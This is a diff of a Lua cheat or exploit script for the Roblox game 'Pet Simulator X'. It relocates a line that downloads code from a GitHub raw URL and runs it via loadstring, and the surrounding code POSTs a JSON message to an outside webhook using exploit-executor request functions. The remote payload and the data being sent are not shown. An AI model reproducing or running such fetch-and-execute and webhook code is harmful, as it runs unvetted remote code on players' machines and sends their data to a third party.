@@ -41,8 +41,6 @@
   }
 }
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))() then
-
 if game.PlaceId == 6284583030 then
 	_G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
@@ -94,3 +92,5 @@ request = http_request or request or HttpPost or syn.request
 request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end
 sendwebhook(msg)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
